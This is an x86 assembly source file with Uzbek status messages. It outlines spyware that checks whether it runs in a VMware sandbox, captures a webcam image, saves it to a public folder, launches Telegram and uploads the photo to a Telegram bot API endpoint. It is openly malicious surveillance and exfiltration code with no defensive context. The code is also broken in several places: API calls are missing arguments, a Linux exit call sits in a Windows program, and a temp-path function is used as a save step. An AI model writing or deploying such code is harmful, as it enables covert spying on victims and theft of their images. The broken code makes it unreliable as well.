section .data
    vm_signature db "VMXh", 0
    found_vm_msg db "Virtual muhit aniqlandi!", 0xA, 0
    not_vm_msg db "Bu haqiqiy tizim!", 0xA, 0
    camera_window db "Webcam", 0
    temp_path db "C:\\Users\\Public\\webcam.jpg", 0
    success_msg db "Rasm saqlandi!", 0xA, 0
    telegram_path db "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Telegram Desktop\\Telegram.exe", 0
    tg_success_msg db "Telegram ishga tushdi!", 0xA, 0
    telegram_api db "https://api.telegram.org/bot<TOKEN>/sendPhoto", 0
section .text
    global _start
    extern printf, ShellExecuteA, capCreateCaptureWindowA, GetTempPathA, InternetOpenA, HttpSendRequestA
_start:
    call check_vm  
    call camera_start  
    call save_photo  
    call telegram_start  
    call send_photo  
    jmp exit
check_vm:
    mov eax, 0x564D5868   
    mov ecx, 0x0A          
    mov dx, 0x5658        
    in eax, dx
    cmp ebx, 0x564D5868    
    jz is_virtual

is_virtual:
    push found_vm_msg
    call printf
    ret

camera_start:
    push camera_window
    call capCreateCaptureWindowA

    push success_msg
    call printf
    ret

save_photo:
    push 256
    push temp_path
    call GetTempPathA

    push success_msg
    call printf
    ret

telegram_start:
    push 0
    push 0
    push 1
    push 0
    push telegram_path
    push 0
    call ShellExecuteA

    push tg_success_msg
    call printf
    ret

send_photo:
    push temp_path
    push telegram_api
    call InternetOpenA
    call HttpSendRequestA
    ret

exit:
    mov eax, 1
    xor ebx, ebx
    int 0x80
